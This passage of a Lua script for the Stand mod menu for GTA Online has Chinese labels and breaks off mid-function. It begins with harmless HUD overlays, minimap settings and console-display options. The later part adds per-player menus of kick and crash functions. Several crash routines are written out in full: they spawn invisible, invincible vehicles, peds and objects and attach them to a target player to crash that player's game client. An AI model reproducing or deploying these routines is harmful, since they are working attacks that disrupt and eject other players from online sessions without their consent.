    clearAreaOfEntities(op, CLEAR_AREA_RANGE)
end)
menu.action(clearAreaTools, "清理收集品", {"clearpickups"}, "", function ()
    local pp = entities.get_all_pickups_as_pointers()
    clearAreaOfEntities(pp, CLEAR_AREA_RANGE)
end)
menu.action(clearAreaTools, "清理所有绳索", {"clearropes"}, "", function() 
    for i = 0, 100 do
        PHYSICS.DELETE_CHILD_ROPE(i)
    end
end)
menu.slider(clearAreaTools, "清理区域范围", {"cleararearange"}, "", 1, 10000, 100, 50, function (value)
    CLEAR_AREA_RANGE = value
end)
function xianshishijian(state)
    timeos = state
        if timeos then
            while timeos do
                util.yield(0)
                draw_string(string.format(os.date('~bold~~italic~~b~%Y-%m-%d ~b~%H:%M:%S', os.time())), 0.83,0.1, 0.5,5)
                end
            end 
    end

replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
pedInterface = memory.read_long(replayInterface + 0x0018)
vehInterface = memory.read_long(replayInterface + 0x0010)
objectInterface = memory.read_long(replayInterface + 0x0028)
pickupInterface = memory.read_long(replayInterface + 0x0020)

fps = 0
util.create_thread(function()
    while true do
        fps = math.ceil(1/SYSTEM.TIMESTEP())
        util.yield(500)
    end
end)
function scripthost()
    inviciamountint = 0
    for pid = 0, 31 do
        if players.exists(pid) and pid ~= players.user() then
            local pped = players.user_ped(pid)
            if pped ~= 0 then
                if players.is_marked_as_modder(pid) then
                    inviciamountint = inviciamountint + 1
                end
            end
        end
local ente

                local ent1e = players.user_ped()
                local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                    ente = ent2e
                else
                    ente = ent1e
                end
                local speede = ENTITY.GET_ENTITY_SPEED(ente)
                local speedcalce = speede * 3.6
                myspeed1e = math.ceil(speedcalce)
            end
        inviciamountintt = inviciamountint
            draw_string(string.format("~h~~f~F~q~P~y~S : ~q~"..fps), 0.19,0.785, 0.3,1)
            draw_string(string.format("~h~~g~"..myspeed1e.." ~h~~y~: ~q~K~f~M~p~/H"), 0.19,0.809, 0.3,1)
            draw_string(string.format("~h~~y~时~b~间:~h~~p~"..os.date("%X")), 0.19,0.836, 0.3,1)    
            draw_string(string.format("~h~~y~战~g~局~y~玩~q~家 : ~q~~f~"..#players.list()), 0.19,0.863, 0.3,1) 
            draw_string(string.format("~h~~r~作~p~弊~g~玩~f~家 : ~h~~r~"..inviciamountintt), 0.19,0.890, 0.3,1) 
			if PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**" then
			draw_string(string.format("~h~~f~战~q~局~r~主~b~机 : ~h~~p~没有人"), 0.19,0.917, 0.3,1)
			else
            draw_string(string.format("~h~~f~战~g~局~y~主~q~机 : ~h~~p~"..players.get_name(players.get_host())), 0.19,0.917, 0.3,1)
			end
			if PLAYER.GET_PLAYER_NAME(players.get_script_host()) == "**Invalid**" then
			draw_string(string.format("~h~~q~脚~f~本~p~主~r~机 : ~h~~q~没有人"), 0.19,0.943, 0.3,1)
			else
            draw_string(string.format("~h~~q~脚~f~本~p~主~r~机 : ~h~~q~"..players.get_name(players.get_script_host())), 0.19,0.943, 0.3,1)
			end
						local hostxvlie = players.get_host_queue_position(players.user())
			if hostxvlie == 0 then
			draw_string(string.format("~h~~p~你~g~现~r~在~b~是~f~战~q~局~y~主~f~机"), 0.19,0.970, 0.3,1) 
			else
			draw_string(string.format("~h~~p~你~f~的~y~主~b~机~f~优~r~先~g~度 :~h~~q~ "..hostxvlie), 0.19,0.970, 0.3,1) 
			end		
end
menu.toggle_loop(other_options, "主机序列", {"hostqu"}, "", function(state)
    scripthost(state)
end)
menu.trigger_commands("hostqu on")

function scripthosts()
    inviciamountint = 0
    for pid = 0, 31 do
        if players.exists(pid) and pid ~= players.user() then
            local pped = players.user_ped(pid)
            if pped ~= 0 then
                if players.is_marked_as_modder(pid) then
                    inviciamountint = inviciamountint + 1
                end
            end
        end
local ente

                local ent1e = players.user_ped()
                local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                    ente = ent2e
                else
                    ente = ent1e
                end
                local speede = ENTITY.GET_ENTITY_SPEED(ente)
                local speedcalce = speede * 3.6
                myspeed1e = math.ceil(speedcalce)
            end
        inviciamountintt = inviciamountint
            draw_string(string.format("~h~~f~实体池信息~"..memory.read_int(pedInterface ).."/"..memory.read_int(pedInterface)), 0,0, 0.4,1)
            draw_string(string.format("~h~~f~PED ~m~  : ~g~"..memory.read_int(pedInterface + 0x0110).."/"..memory.read_int(pedInterface + 0x0108)), 0,0.03, 0.4,1)
            draw_string(string.format("~h~~f~载具 ~m~  : ~y~"..memory.read_int(vehInterface + 0x0190).."/"..memory.read_int(vehInterface + 0x0188)), 0,0.06, 0.4,1)
            draw_string(string.format("~h~~f~实体 ~m~  : ~r~"..memory.read_int(objectInterface + 0x0168).."/"..memory.read_int(objectInterface + 0x0160)), 0,0.09, 0.4,1)
            draw_string(string.format("~h~~f~货物~m~   :~q~ "..memory.read_int(pickupInterface + 0x0110).."/"..memory.read_int(pickupInterface + 0x0108)), 0,0.12, 0.4,1)
            end

menu.toggle(other_options, "显示脚本名称", {"scriptname"}, "", function(state)
    xianshijiaoben(state)
end)

menu.toggle_loop(other_options, "名称信息", {""}, "", function()
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.5,0.125,0)
    GRAPHICS.DRAW_RECT(0.001, 0.999, 4.5, 0.085, 0, 0, 0, 0)
    HUD.SET_TEXT_SCALE(1.0,0.53)
    HUD.SET_TEXT_COLOUR(60,100,255,255)
    HUD.SET_TEXT_FONT(2)
    HUD.SET_TEXT_CENTRE(true)
    HUD.SET_TEXT_OUTLINE(true)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~f~G~q~r~r~a~b~n~g~d~y~T~q~o~f~u~p~r~f~i~q~n~r~gV~b~I~g~P")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.5,0.3,0)
end)

    menu.toggle(other_options, "显示时间", {"timeos"}, "", function(state)
        xianshishijian(state)
    end)

    menu.toggle(other_options, "显示速度", {"speedmeteor"}, "", function(state)
        speedm = state  
        while speedm do
            local ent
                local ent1 = players.user_ped()
                local ent2 = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                if PED.IS_PED_IN_ANY_VEHICLE(ent1,true) then
                    ent = ent2
                else
                    ent = ent1
                end
                local speed = ENTITY.GET_ENTITY_SPEED(ent)
                local speedcalc = speed * 3.6
                myspeed1 = math.ceil(speedcalc)
            util.yield()
            draw_string(string.format("~bold~~italic~~b~"..myspeed1 .. "  ~p~KM/H"), 0.84,0.8, 1,5)
            end
    end,speedm)

menu.toggle_loop(other_options, "实体池信息", {"hostqus"}, "", function(state)
    scripthosts(state)
end)

menu.toggle(other_options, "玩家栏", {"playersbar"}, "", function(state)
    bar = state        
    while bar do
    posx = 0.001
    posy = 0.00
    for pid = 0,31 do
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
    color =  {["r"] = 255/255,["g"] = 255/255,["b"] = 255/255,["a"] = 255/255} 
    tags = ""
    network = memory.alloc(13*4)
    name = PLAYER.GET_PLAYER_NAME(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid,network,13)
    if players.is_marked_as_modder(pid) then
        tags = tags .. "[作弊者]"
    color = {["r"] = 255/255,["g"] = 0/255,["b"] = 0/255,["a"] = 255/255}   
    end
    if players.is_godmode(pid) then 
        tags = tags .. "[无敌]"
    color = {["r"] = 255/255,["g"] = 0/255,["b"] = 255/255,["a"] = 255/255} 
    end
    if players.is_in_interior(pid) then
        tags = tags .. "[室内]"
    color = {["r"] = 0/255,["g"] = 255/255,["b"] = 255/255,["a"] = 255/255} 
    end
    if players.is_marked_as_attacker(pid) then
        tags = tags .. "[攻击过你]"
    color = {["r"] = 255/255,["g"] = 255/255,["b"] = 128/255,["a"] = 255/255} 
    end
    if NETWORK.NETWORK_IS_FRIEND(network) then
        tags = tags .. "[好友]"
    color = {["r"] = 7/255,["g"] = 55/255,["b"] = 99/255,["a"] = 255/255}
    end
    if players.get_host() == pid then
        tags = tags .. "[主机]"
    color = {["r"] = 0/255,["g"] = 255/255,["b"] = 0/255,["a"] = 255/255} 
    end
    if players.get_script_host() == pid then
        tags = tags .. "[脚本主机]"
    color = {["r"] = 153/255,["g"] = 0/255,["b"] = 255/255,["a"] = 255/255} 
    end
    memory.free(network)
    directx.draw_text(posx,posy,name.." "..tags,ALIGN_TOP_LEFT,0.45,color)
    posx = posx + 0.145
    if posx > 0.96 then
    posy = posy + 0.0175
    posx = 0.001
    end
    end
    end
    util.yield()
    end
    end)

menu.toggle_loop(other_options, "感谢人员", {"Richman"}, "感谢大家", function()
        draw_string(string.format("~italic~~bold~~q~感谢人员"), 0.960,0.015,0.25,5)
        draw_string(string.format("~italic~~bold~~r~12"), 0.987,0.035,0.25,5)
        draw_string(string.format("~italic~~bold~~b~黑石"), 0.980,0.055,0.25,5)
        draw_string(string.format("~italic~~bold~~g~Super飞"), 0.965,0.075,0.25,5)
        draw_string(string.format("~italic~~bold~~y~柒月"), 0.982,0.095,0.25,5)
        draw_string(string.format("~italic~~bold~~q~jinx"), 0.982,0.115,0.25,5)
        draw_string(string.format("~italic~~bold~~f~小马哥"), 0.972,0.135,0.25,5)
        draw_string(string.format("~italic~~bold~~p~丢丢"), 0.982,0.155,0.25,5)
end)

menu.toggle_loop(other_options, "跳到下一条对话", {}, "", function()
    if AUDIO.IS_SCRIPTED_CONVERSATION_ONGOING() then
        AUDIO.SKIP_TO_NEXT_SCRIPTED_CONVERSATION_LINE()
    end
end)

util.yield(1000)

minimap = menu.list(other_options, "小地图")
menu.toggle_loop(minimap, "地图闪烁", {"party_mode_cmd"}, "五彩斑斓的小地图", function(on)
    HUD.FLASH_MINIMAP_DISPLAY_WITH_COLOR(hud_rgb_colors[hud_rgb_index])
    hud_rgb_index = hud_rgb_index + 1
    if hud_rgb_index == 4 then
        hud_rgb_index = 1
    end
    util.yield(200)
end)
menu.toggle(minimap,"显示声纳", {"sonaronmap"}, "", function(on)
	HUD._SET_MINIMAP_SONAR_ENABLED(on)
end)
mapzoom = 1
menu.slider(minimap, "小地图缩放", {"minimapzoom"}, "", 0, 100, 0, 1, function(s)
    HUD.SET_RADAR_ZOOM_PRECISE(s)
end)

mapangle = 0
menu.slider(minimap,"小地图角度", {"minimapanglme"}, "", 0, 360, 0, 1, function(s)
    mapangle = s
end)

mapanglet = off
menu.toggle(minimap,"锁定地图角度", {"lockminimapangle"}, "", function(on)
	mapanglet = on
	while mapanglet do
		HUD.LOCK_MINIMAP_ANGLE(mapangle)
		util.yield()
	end
	HUD.UNLOCK_MINIMAP_ANGLE()
end)
 centermap = off
menu.toggle(minimap, "以你为中心的地图", {"centermap"}, "", function(on)
	centermap = on
	while centermap do 
		HUD.DONT_TILT_MINIMAP_THIS_FRAME()
		util.yield()
	end
end)

local nextcons = menu.list(other_options, "控制台")
timestamp_toggle = false
menu.action(nextcons, "复制控制台信息到剪贴板", {}, "将控制台信息的完整的最后x行复制到剪贴板.", function()
    util.copy_to_clipboard(full_stdout, true)
end)

menu.slider(nextcons, "最大显示字符", {"nconsolemaxchars"}, "", 1, 1000, 200, 1, function(s)
    max_chars = s
end)

menu.slider(nextcons, "最大显示行数", {"nconsolemaxlines"}, "", 1, 60, 25, 1, function(s)
    max_lines = s
end)

menu.slider_float(nextcons, "字体大小", {"nconsolemaxlines"}, "", 1, 1000, 35, 1, function(s)
    font_size = s*0.01
end)

menu.toggle(nextcons, "显示时间", {"ntime"}, "", function(on)
    timestamp_toggle = on
end, false)

draw_toggle = false
menu.toggle(nextcons, "绘制控制台", {"ndrawconsole"}, "", function(on)
    draw_toggle = on
end, false)

local text_color = {r = 1, g = 0, b = 0, a = 1}
menu.colour(nextcons, "文字颜色", {"nconsoletextcolor"}, "", 1, 0, 0, 1, true, function(on_change)
    text_color = on_change
end)

local bg_color = {r = 0, g = 0, b = 0, a = 0}
menu.colour(nextcons, "背景颜色", {"nconsolebgcolor"}, "", 0, 0, 0, 0, true, function(on_change)
    bg_color = on_change
end)

util.create_tick_handler(function()
    local text = get_last_lines(log_dir)
    if draw_toggle then
        local size_x, size_y = directx.get_text_size(disp_stdout, font_size)
        size_x += 0.01
        size_y += 0.01
        directx.draw_rect(0.0, 0.15, size_x, size_y, bg_color)
        directx.draw_text(0.0, 0.15, disp_stdout, 0, font_size, text_color, true)
    end
end)
--显示stand版本
local window_x = 0.01
local window_y = 0.03
local text_margin = 0.003
local text_height = 0.018 
local window_width = 0.12
local window_height = 0.2
local menu_items = {
    "！！！！！！！！！"   
}
local selected_index = 0

local blur_rect_instance
local function colour(r, g, b, a)
    return { 
        r = r / 255,
        g = g / 255,
        b = b / 255,
        a = a / 255
    }
end
local function gui_background(x, y, width, height, blur_radius)
    local background = colour(10, 0, 10, 100)
    local border_color_left = colour(255, 0, 255, 255)
    local border_color_right = colour(0, 0, 0, 255)
    directx.blurrect_draw(
        blur_rect_instance, 
        x, y, width, height,
        blur_radius or 5
    )
    directx.draw_rect(
        x, y,
        width, height,
        background
    )
    directx.draw_line(
        x, y,
        x, y + height,
        border_color_left
    )
    directx.draw_line(
        x, y,
        x + width, y,
        border_color_left, border_color_right
    )
    directx.draw_line(
        x + width, y,
        x + width, y + height,
        border_color_right
    )
    directx.draw_line(
        x, y + height,
        x + width, y + height,
        border_color_left, border_color_right
    )
end
local function text(text, x, y, text_scale, highlighted)
    if highlighted then
        directx.draw_rect(
            x, y,
            window_width - (text_margin * 2), text_height,
            colour(15, 15, 15, 0)
        )
    end

    directx.draw_text(
        x, y, text, ALIGN_TOP_LEFT, text_scale,
        colour(255, 255, 255, 255)
    )
end
local insinsts = "FocusOut"
local function render_list(x, y, list, selected_index)
    local ty = 0
    local text_scale = 0.5

    for i,v in pairs(list) do
        local highlighed = i == selected_index - 1

        text(v, x, y + ty, text_scale, highlighed)
        ty = ty + text_height
    end
end

local function edition_string()
    local edition = menu.get_edition()

    if edition == 0 then
        return "免费版"
    elseif edition == 1 then
        return "基础版"
    elseif edition == 2 then
        return "常规版"
    elseif edition == 3 then
        return "终极版"
    end
end

local function render_menu()
    local width = window_width
    local height = window_height

    gui_background(window_x, window_y,
        width, height)

    text("Stand " .. edition_string(),
        window_x + text_margin,
        window_y + text_margin,
        0.6, false)
    
    local top_margin = 0.025
    
    render_list(
        window_x + text_margin,
        window_y + text_margin + top_margin,
        menu_items, selected_index
    )
end

local function set_menu_open(toggle) end 

local menu_is_open = false

local function input_handler()
    if menu.is_open() then return end

    local VK_NUMPAD8 = 0x68
    local VK_NUMPAD2 = 0x62

    if util.is_key_down(VK_NUMPAD2) then
        selected_index = selected_index + 1

    elseif util.is_key_down(VK_NUMPAD8) then
        selected_index = selected_index - 1

    end
end

local function tick_handler()
    if menu_is_open then
        render_menu()
    end

    input_handler()
    return true
end

blur_rect_instance = directx.blurrect_new()
util.create_tick_handler(tick_handler) 

function set_menu_open(toggle)
    if toggle and not menu_is_open then
        menu_is_open = true
        
    elseif not toggle and menu_is_open then
        menu_is_open = false

    end
end

menu.toggle(other_options, "stand版本", {}, "", function(toggle)
    set_menu_open(toggle)
end)

local misclightmenu = menu.list(other_options, "亮了")

rlight = 255

menu.slider(misclightmenu, "R", {"lightred"}, "", 0, 255, 255, 1, function(s)

	rlight = s 

end)

glight = 255

menu.slider(misclightmenu, "G", {"lightgreen"}, "", 0, 255, 255, 1, function(s)

	glight = s

end)

blight = 255

menu.slider(misclightmenu, "B", {"lightblue"}, "", 0, 255, 255, 1, function(s)

	blight = s

end)

Radiuslight = 1

menu.slider(misclightmenu, "半径" ,{"lightradius"}, "", 0, 9000, 1, 1, function(s)

	Radiuslight = s

end)

intenslight = 1

menu.slider(misclightmenu, "强度", {"lightintensity"}, "", 0, 1000, 1, 1, function(s)

	intenslight = s

end)

menu.toggle_loop(misclightmenu, "亮了", {"lighton"}, "", function()

    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())

	GRAPHICS.DRAW_LIGHT_WITH_RANGE(pos.x, pos.y, pos.z, rlight, glight, blight, Radiuslight, intenslight)

end)

menu.toggle_loop(other_options, "跳到下一条对话", {}, "", function()
    if AUDIO.IS_SCRIPTED_CONVERSATION_ONGOING() then
        AUDIO.SKIP_TO_NEXT_SCRIPTED_CONVERSATION_LINE()
    end
end)

GenerateFeatures = function(PlayerID)
    menu.divider(menu.player_root(PlayerID), "GRANGTOURING")

	menu.action(menu.player_root(PlayerID), "添加到虚假配置文件", {}, "", function ()
        playerspooffile(PlayerID)
	end)

        PlayerMainMenu = menu.list(menu.player_root(PlayerID), "踢出选项", {"GTremove"}, "", function(); end)

        menu.divider(PlayerMainMenu, "踢出功能")

        menu.action(PlayerMainMenu, "快速踢出", {}, "", function()
            KickPlayer(PlayerID, "Smart")
        end)

        menu.action(PlayerMainMenu, "断开连接", {}, "", function()
            KickPlayer(PlayerID, "Breakup")
        end)

        menu.action(PlayerMainMenu, "黑名单踢", {}, "", function()
            KickPlayer(PlayerID, "Ban")
        end)

    menu.action(PlayerMainMenu, "AIO踢出", {"aiok", "aiokick"}, "如果在战局功能中启用了“更慢但是更好的aio ”,那么在这里也使用它。", function ()
        AIOKickPlayer(PlayerID)
    end)

            menu.action(PlayerMainMenu, "阻止加入踢", {"blast"}, "将他们踢出并加入到阻止加入列表上", function()
                blockjoinkick(PlayerID)
            end)

            menu.action(PlayerMainMenu, "静默踢", {}, "", function()
                silencekick(PlayerID)
            end)

            menu.action(PlayerMainMenu, "美国国家航空航天局踢", {}, "", function()
                nasakick(PlayerID)
            end)
        
            menu.action(PlayerMainMenu, "自然死亡踢", {"freemodedeath"}, "将杀死他们的自由模式并将他们送回故事模式", function()
                freemodekick(PlayerID)
            end)
    
            menu.action(PlayerMainMenu, "网络保释踢", {"networkbail"}, "", function()
                networkkick(PlayerID)
            end)
        
            menu.action(PlayerMainMenu, "无效掉落踢", {"invalidcollectible"}, "", function()
                invalidcollectiblekick(PlayerID)
            end)
        
        
            if menu.get_edition() >= 2 then 
                menu.action(PlayerMainMenu, "智能踢", {"adaptivekick"}, "", function()
                    autokickv1(PlayerID)
                end)
            else
                menu.action(PlayerMainMenu, "智能踢", {"adaptivekick"}, "", function()
                    autokickv2(PlayerID)
                end)
            end

        PlayerMainMenu = menu.list(menu.player_root(PlayerID), "崩溃选项", {"GTremove"}, "", function(); end)


------------------------------------
-------------玩家崩溃---------------
------------------------------------
    menu.divider(PlayerMainMenu, "崩溃功能")

    menu.toggle(PlayerMainMenu, '怒不可遏2.0', {}, '建议开启悬浮模式，远离！', function (on)
       if on then 
        menu.trigger_commands("tuoche".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("dh".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("huocheb".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("badoutfit".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("rockets".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("EXPL".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("PCAGE".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("ObjCage".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("FreePedcage".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("FreeObjcage".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("JuggleC".. PLAYER.GET_PLAYER_NAME(PlayerID))
        else
        menu.trigger_commands("tuoche".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("dh".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("BadNetVehicleCrashV2".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("huocheb".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("badoutfit".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("rockets".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("EXPL".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("PCAGE".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("ObjCage".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("FreePedcage".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("FreeObjcage".. PLAYER.GET_PLAYER_NAME(PlayerID))
        menu.trigger_commands("JuggleC".. PLAYER.GET_PLAYER_NAME(PlayerID))
        end
    end)

function spawn_vehicle(hash,pos,isGodMode,isFreeze)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield(1)
	end
   local car= entities.create_vehicle(hash,pos,0)
    if isGodMode then 
        ENTITY.SET_ENTITY_INVINCIBLE(car,true)
    end
    if isFreeze then
        ENTITY.FREEZE_ENTITY_POSITION(car,true)
    end
    return car
end

function delete_entity_by_vehicle(hash)
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(ent)==hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
        end
    end
end

bengk2t = menu.list(PlayerMainMenu, "崩溃2T", {}, "")
    menu.action(bengk2t,"崩溃2T",{},"你猜行不行",function()
        ENTITY.FREEZE_ENTITY_POSITION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID),true,false,true)
        pos=ENTITY.GET_ENTITY_COORDS( PLAYER.GET_PLAYER_PED(PlayerID))
        pos.z= pos.z+1000
        for d=1,4 do 
            pos.z= pos.z+20
            for i=1,60 do
                spawn_vehicle(3602674979,pos,true,true)
                util.yield(50)
                if i==59 then
                    util.toast("第"..d.."次发送完成",1)
                end
            end
            util.yield(3000)
            delete_entity_by_vehicle(-692292317)
            util.yield(300)
        end
        util.yield(3000)
        ENTITY.FREEZE_ENTITY_POSITION( PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID),false)
    end)

menu.action(bengk2t,"崩溃2TPLUS",{},"",function()
    local model_array <const> = {0x58f77553,0x1446590a}
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) pos.x = pos.x + 3
    local ped <const> = CreatePed(26,util.joaat("ig_kaylee"),pos,0)
    for spawn, vel in pairs(model_array) do
    local ves <const> = {}
    ves[spawn] = CreateVehicle(vel,pos,0)
    for key, value in pairs(ves) do
    PED.SET_PED_INTO_VEHICLE(ped,value,-1)
    ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(ped,value,1,1,100,10,1, true, true)
    end
    util.yield(2000)
    local vels_ <const> = entities.get_all_vehicles_as_handles()
    for delete, value in pairs(vels_) do
    entities.delete_by_handle(value)
    entities.delete_by_handle(ped)
    end
    end
    end)

    menu.action(bengk2t,"崩溃2TPRO",{},"",function()
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    pos.x = pos.x + 3
    local rat <const> = CreatePed(26,util.joaat("a_c_rat"),pos,0)
    ENTITY.SET_ENTITY_VISIBLE(rat,false)
    local obs <const> = OBJECT.CREATE_OBJECT_NO_OFFSET(1888301071, pos.x, pos.y, pos.z,true,false)
    PED.SET_PED_INTO_VEHICLE(rat,obs,-1)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),obs,-1)
    local time <const> = util.current_time_millis() + 3500
    while time > util.current_time_millis() do
    ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(obs, 0, 0, true, true)
    util.yield(100)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(rat)
    TASK.TASK_LEAVE_VEHICLE(rat, obs, 0)
    util.yield(5)
    end
    entities.delete_by_handle(rat)
    end)

    menu.action(bengk2t,"崩溃2TMAX",{},"",function() 
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) pos.x = pos.x + 3
    local model = {util.joaat("cs_wade"),util.joaat("a_c_rat")}
    for _spawn, value in pairs(model) do
    local task_crash = {}
    task_crash[_spawn] = CreatePed(26,value,pos,0)
    ENTITY.FREEZE_ENTITY_POSITION(task_crash[_spawn],true)
    for start, value1 in pairs(task_crash) do
        local play = {}
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(value1, util.joaat("weapon_pistol"), 0, true)
        util.yield(200)
    play[start] = MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+1, pos.x, pos.y, pos.z, 0, true, 453432689, model, true, false, 100)
        util.yield(500)
    ENTITY.FREEZE_ENTITY_POSITION(value1,false)
    end
        util.yield(1000)
    end
    end)

    menu.action(bengk2t,"崩溃2TPROMAX",{},"",function()                          
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
    pos.x = pos.x + 3
    local sb_ped <const> = CreatePed(26,util.joaat("a_c_rat"),pos,0)
    local crash_plane <const> = CreateVehicle(0x9c5e5644,pos,0)
    PED.SET_PED_INTO_VEHICLE(sb_ped,crash_plane,-1)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crash_plane,-1)
    ENTITY.FREEZE_ENTITY_POSITION(crash_plane,true)
    local time <const> = util.current_time_millis() + 3500
    TASK.TASK_OPEN_VEHICLE_DOOR(players.user_ped(players.user()), crash_plane, 9999, -1, 2)
    while time > util.current_time_millis() do
    TASK.TASK_LEAVE_VEHICLE(sb_ped, crash_plane, 0)
    util.yield(5)
    end
    entities.delete_by_handle(sb_ped)
    end)

menu.action(PlayerMainMenu,"无效绳索崩溃",{},"",function()
  pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
  dune = CreateVehicle(3602674979, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(dune, true)
  ENTITY.SET_ENTITY_VISIBLE(dune, false)
  dune1 = CreateVehicle(2633113103, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(dune1, true)
  ENTITY.SET_ENTITY_VISIBLE(dune1, false)
  barracks = CreateVehicle(3602674979, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)
  ENTITY.SET_ENTITY_VISIBLE(barracks, false)
  barracks1 = CreateVehicle(3471458123, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(barracks1, true)
  ENTITY.SET_ENTITY_VISIBLE(barracks1, false)
  dunecar = CreateVehicle(3852654278, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(dunecar, true)
  ENTITY.SET_ENTITY_VISIBLE(dunecar, false)
  barracks3 = CreateVehicle(630371791, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(barracks3, true)
  ENTITY.SET_ENTITY_VISIBLE(barracks3, false)
  barracks31 = CreateVehicle(630371791, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(barracks31, true)
  ENTITY.SET_ENTITY_VISIBLE(barracks31, false)
  ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  car = CreatePed(26, 2459507570, pos, 0)
  ENTITY.SET_ENTITY_INVINCIBLE(car, true)
  for i = 5, 1 do
    invalidpeda = CreatePed(26, 2459507570, pos, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
    ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, car, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  end
  for i = 8, 2 do
    invalidpeda = CreatePed(26, 2459507570, pos, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(invalidpeda, car, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  end
  for i = 2, 15 do
    invalidpeda = CreatePed(26, 2459507570, pos, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(invalidpeda, car, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  end
  ENTITY.ATTACH_ENTITY_TO_ENTITY(car, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  pedp = players.user_ped(PlayerID)
  ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
  ENTITY.DETACH_ENTITY(dunecar)
